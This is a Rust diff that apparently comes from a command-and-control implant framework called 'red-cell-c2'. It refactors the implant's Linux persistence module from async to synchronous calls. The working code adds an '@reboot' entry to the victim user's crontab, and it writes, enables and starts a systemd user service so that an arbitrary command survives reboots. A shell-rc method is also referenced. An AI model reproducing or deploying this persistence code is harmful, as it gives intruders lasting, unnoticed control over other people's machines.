@@ -1,12 +1,11 @@
 //! `CommandPersist` (ID 3000): Linux persistence mechanisms.
 
 use std::fs;
+use std::io::Write;
 use std::path::PathBuf;
-use std::process::Stdio;
+use std::process::{Command, Stdio};
 
-use red_cell_common::demon::PhantomPersistMethod;
-use red_cell_common::demon::PhantomPersistOp;
-use tokio::process::Command;
+use red_cell_common::demon::{PhantomPersistMethod, PhantomPersistOp};
 
 use crate::error::PhantomError;
 use crate::parser::TaskParser;
@@ -53,8 +52,8 @@ pub(super) async fn execute_persist(
     };
 
     let result = match method {
-        PhantomPersistMethod::Cron => persist_cron(op, &command_str).await,
-        PhantomPersistMethod::SystemdUser => persist_systemd_user(op, &command_str).await,
+        PhantomPersistMethod::Cron => persist_cron(op, &command_str),
+        PhantomPersistMethod::SystemdUser => persist_systemd_user(op, &command_str),
         PhantomPersistMethod::ShellRc => persist_shell_rc(op, &command_str),
     };
 
@@ -71,12 +70,11 @@ pub(super) async fn execute_persist(
 /// Install appends `@reboot <command> # red-cell-c2` to the current user's
 /// crontab if the marker is not already present.  Remove filters out any line
 /// containing the marker.
-async fn persist_cron(op: PhantomPersistOp, command: &str) -> Result<String, String> {
+fn persist_cron(op: PhantomPersistOp, command: &str) -> Result<String, String> {
     // Read existing crontab; treat an empty/missing crontab as success.
     let crontab_output = Command::new("crontab")
         .args(["-l"])
         .output()
-        .await
         .map_err(|e| format!("crontab -l failed: {e}"))?;
 
     let existing = if crontab_output.status.success() {
@@ -114,12 +112,12 @@ async fn persist_cron(op: PhantomPersistOp, command: &str) -> Result<String, Str
 
     {
         let stdin = child.stdin.as_mut().ok_or_else(|| "crontab stdin unavailable".to_owned())?;
-        tokio::io::AsyncWriteExt::write_all(stdin, new_crontab.as_bytes())
-            .await
+        stdin
+            .write_all(new_crontab.as_bytes())
             .map_err(|e| format!("crontab write failed: {e}"))?;
     }
 
-    let status = child.wait().await.map_err(|e| format!("crontab wait failed: {e}"))?;
+    let status = child.wait().map_err(|e| format!("crontab wait failed: {e}"))?;
     if !status.success() {
         return Err(format!("crontab exited with status {status}"));
     }
@@ -132,7 +130,7 @@ async fn persist_cron(op: PhantomPersistOp, command: &str) -> Result<String, Str
 
 /// Install or remove a systemd user service unit at
 /// `~/.config/systemd/user/red-cell.service`.
-async fn persist_systemd_user(op: PhantomPersistOp, command: &str) -> Result<String, String> {
+fn persist_systemd_user(op: PhantomPersistOp, command: &str) -> Result<String, String> {
     let home = std::env::var("HOME").map_err(|_| "HOME not set".to_owned())?;
     let unit_dir = PathBuf::from(&home).join(".config/systemd/user");
     let unit_path = unit_dir.join(format!("{PERSIST_UNIT_NAME}.service"));
@@ -150,9 +148,9 @@ async fn persist_systemd_user(op: PhantomPersistOp, command: &str) -> Result<Str
                 .map_err(|e| format!("write {}: {e}", unit_path.display()))?;
 
             // Reload daemon, then enable + start the unit.
-            run_systemctl(&["--user", "daemon-reload"]).await?;
-            run_systemctl(&["--user", "enable", &format!("{PERSIST_UNIT_NAME}.service")]).await?;
-            run_systemctl(&["--user", "start", &format!("{PERSIST_UNIT_NAME}.service")]).await?;
+            run_systemctl(&["--user", "daemon-reload"])?;
+            run_systemctl(&["--user", "enable", &format!("{PERSIST_UNIT_NAME}.service")])?;
+            run_systemctl(&["--user", "start", &format!("{PERSIST_UNIT_NAME}.service")])?;
 
             Ok(format!("systemd user unit installed at {}", unit_path.display()))
         }
@@ -162,15 +160,13 @@ async fn persist_systemd_user(op: PhantomPersistOp, command: &str) -> Result<Str
             }
 
             // Best-effort stop/disable; ignore errors so we still clean up the file.
-            let _ =
-                run_systemctl(&["--user", "stop", &format!("{PERSIST_UNIT_NAME}.service")]).await;
-            let _ = run_systemctl(&["--user", "disable", &format!("{PERSIST_UNIT_NAME}.service")])
-                .await;
+            let _ = run_systemctl(&["--user", "stop", &format!("{PERSIST_UNIT_NAME}.service")]);
+            let _ = run_systemctl(&["--user", "disable", &format!("{PERSIST_UNIT_NAME}.service")]);
 
             fs::remove_file(&unit_path)
                 .map_err(|e| format!("remove {}: {e}", unit_path.display()))?;
 
-            run_systemctl(&["--user", "daemon-reload"]).await?;
+            run_systemctl(&["--user", "daemon-reload"])?;
 
             Ok(format!("systemd user unit removed from {}", unit_path.display()))
         }
@@ -178,11 +174,10 @@ async fn persist_systemd_user(op: PhantomPersistOp, command: &str) -> Result<Str
 }
 
 /// Run `systemctl` with the given arguments, returning an error string on failure.
-async fn run_systemctl(args: &[&str]) -> Result<(), String> {
+fn run_systemctl(args: &[&str]) -> Result<(), String> {
     let status = Command::new("systemctl")
         .args(args)
         .status()
-        .await
         .map_err(|e| format!("systemctl {:?} failed: {e}", args))?;
     if status.success() {
         Ok(())
